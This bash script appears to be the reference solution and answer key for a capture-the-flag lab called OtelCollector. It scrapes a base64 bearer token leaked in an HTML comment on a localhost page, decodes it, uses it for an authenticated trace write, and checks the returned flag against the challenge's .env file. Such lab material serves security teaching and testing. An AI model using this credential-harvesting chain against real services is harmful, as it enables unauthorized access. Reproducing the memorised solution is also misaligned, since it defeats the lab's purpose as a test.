#!/usr/bin/env bash
# ============================================================
# OtelCollector (labs11) — reference solution: bearer token
# disclosed in an HTML comment
#
# Chain: read the base64 comment on the landing page -> decode
# "otel-collector-token:<token>" -> one authenticated write to
# /v1/traces with a benign payload (token stays in the
# Authorization header, never in the payload).
#
# Usage: ./run.sh [base-url]     (default http://localhost:8091)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8091}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] decoding the telemetry token from the HTML comment" >&2
B64="$(curl -fsS "$BASE/" | grep -oE 'telemetry: [A-Za-z0-9+/=]+' | head -n1 | cut -d' ' -f2)"
[[ -n "$B64" ]] || { echo "[-] failed: telemetry comment not found" >&2; exit 1; }
TOKEN="$(printf '%s' "$B64" | base64 -d | cut -d: -f2)"
[[ -n "$TOKEN" ]] || { echo "[-] failed: could not decode token" >&2; exit 1; }

echo "[*] one authenticated trace write with a benign payload" >&2
RESP="$(curl -fsS -X POST "$BASE/v1/traces" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"spans":[{"name":"test"}]}')"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
